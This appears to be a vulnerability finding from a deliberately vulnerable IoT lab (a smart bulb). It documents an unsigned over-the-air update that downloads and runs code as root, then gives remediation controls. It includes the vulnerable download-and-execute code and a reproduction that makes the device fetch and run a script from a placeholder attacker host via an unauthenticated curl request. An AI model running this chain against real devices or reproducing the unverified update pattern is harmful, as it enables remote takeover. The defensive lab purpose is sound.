---
id: BULB-04
title: "Unsigned over-the-air update (attacker-served payload runs on the device)"
category: IoT
status: IN PROGRESS
severity: Critical
owasp: "OWASP IoT Top 10 (2018) I4 - Lack of Secure Update Mechanism"
standard: "ETSI EN 303 645 5.7 (ensure software integrity), 5.3 (keep software updated)"
regulation: "CRA (EU) 2024/2847 Annex I Part I - secure updates"
cwe: "CWE-347 (Improper Verification of Cryptographic Signature) / CWE-494 (Download of Code Without Integrity Check)"
source_docs:
  - "stages/01_spec/output/bulbbee-04-spec.md"
affected_components:
  - "labs/bulbbee/files/opt/bulbbee/update_agent.py"
  - "labs/bulbbee/files/opt/bulbbee/lighting_service.py"
verified_date: "2026-09-04"
---

## Why It Matters

The bulb fetches and applies a firmware / scene-pack update with no signature, origin, or version check. An attacker who can point it at a URL, over the unauthenticated `:8082` `/update` endpoint (chaining BULB-02) or by controlling the resolved host, runs arbitrary code on the device as the service user, which is root on OpenWRT. This is the highest-impact BulbBee finding: full device code execution from an unauthenticated position, and a direct break of the CRA secure-update essential requirement.

## Root Cause

`update_agent.apply_update` downloads a URL and executes the bytes with no verification:

```python
# update_agent.py
def apply_update(url):
    data = _download(url)                       # attacker-controlled URL, no allowlist
    path = os.path.join(UPDATE_DIR, "update.sh")
    with open(path, "wb") as f:
        f.write(data)                           # no signature check
    os.chmod(path, 0o755)
    subprocess.run(["sh", path], timeout=30, check=False)   # runs whatever was served
    return path
```

The unauthenticated HTTP trigger turns it into remote code execution:

```python
# lighting_service.py
elif self.path == "/update":
    import update_agent
    update_agent.apply_update(data.get("url", ""))   # no auth (BULB-02), no integrity (here)
```

Missing controls: a cryptographic signature check on the payload, an origin allowlist, and a version / rollback guard.

## Steps to Reproduce

```sh
# attacker serves a payload (writes a marker, or drops an SSH key, or opens a shell)
cat > /tmp/firmware.sh <<'EOF'
#!/bin/sh
touch /tmp/pwned_by_bulb_update
EOF
python3 -m http.server 8000 &   # on the attacker host

# trigger the unsigned update from an unauthenticated LAN position
curl -X POST http://192.168.2.1:8082/update -d '{"url":"http://ATTACKER:8000/firmware.sh"}'

# on the device: the payload ran as root
ssh root@192.168.2.1 'ls -l /tmp/pwned_by_bulb_update'
```

## Expected Result

The served script executes on the device (the marker exists), with no signature, origin, or version check anywhere in the path, from an unauthenticated caller.

## How It Should Be

- Verify a cryptographic signature (for example Ed25519 / minisign) over the update before applying it, with the public key baked into the image.
- Restrict the update origin to an allowlisted host over TLS.
- Add a version / rollback guard so an old or downgraded image is refused.
- Remove the unauthenticated trigger (BULB-02 fix), require an authenticated update request.

These land behind the `secure` UCI toggle (BULB-SEC).

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Device (update) | Verify an Ed25519 signature before applying | Integrity of the update (CWE-347) |
| Device (update) | Origin allowlist over TLS | No arbitrary-host fetch (CWE-494) |
| Device (update) | Version / rollback guard | No downgrade |
| Device (API) | Authenticate the `/update` trigger | Close the unauthenticated RCE (BULB-02) |

## Verification Checklist

- [ ] A payload served by an attacker host executes on the device via `POST /update`.
- [ ] No signature / origin / version check exists in `apply_update`.
- [ ] In `secure` mode an unsigned payload is rejected (BULB-SEC).
